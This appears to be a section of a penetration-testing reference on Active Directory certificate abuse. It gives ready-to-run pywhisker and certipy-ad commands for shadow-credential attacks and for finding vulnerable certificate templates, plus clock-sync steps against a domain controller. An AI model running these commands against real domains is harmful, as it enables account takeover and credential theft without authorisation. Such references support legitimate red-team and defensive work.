# 08 - Certificate abuse
This section contains references for abusing certificates to obtain or escalate credentials.

NOTE: Some of these commands may require time syncing with the target domain controller:

```
# Disable NTP auto-update and match date and time with target
sudo timedatectl set-ntp off		
sudo rdate -n $target_ip

# Turn on ntp auto-update when done
#sudo timedatectl set-ntp on`
```




## Shadow credentials
Shadow credentials generates a certificate for a user account, that can be used to authenticate as that account.

### Creating Shadow Credentials with Pywhisker
This tool allows users to manipulate the msDS-KeyCredentialLink attribute of a target user/computer to obtain full control over that object.

Install into a virtual environment using pip: `pip install pywhisker`
- `pywhisker -d $domain -u "$user" -p "$pass" --target "$target_account" --action "list"`:

List current KeyCredential IDs for the target account
- `pywhisker -d $domain -u "$user" -p "$pass" --target "$target_account" --action "add" --filename output.pfx`


### Creating Shadow Credentials with Certipy-AD
Certipy can return a hash much easier than using Pywhisker.
```
# If you have a username & password
certipy-ad shadow auto -u $user@$domain -p $pass -account $target_account -dc-ip $target_ip

# If you have a usrename & hash
certipy-ad shadow auto -u $user@$domain -hashes $hash -account $target_account -dc-ip $target_ip
```



## Finding certificate vulnerabilities with Certipy-AD 
Certipy has a find mode that can be used fo find vulnerabilities. By default output will be stored as .json and .txt format in the current folder.

```
certipy-ad find $user@$domain -p $pass -dc-ip $target_ip -vulnerable
```

Useful options:
- `enabled`: Show only enabled certificate templates
- `-vulnerable`: Only show vulnerable certificates or templates
- `-stdout`: Output result to console rather than storing as .json and .txt in current directory (default)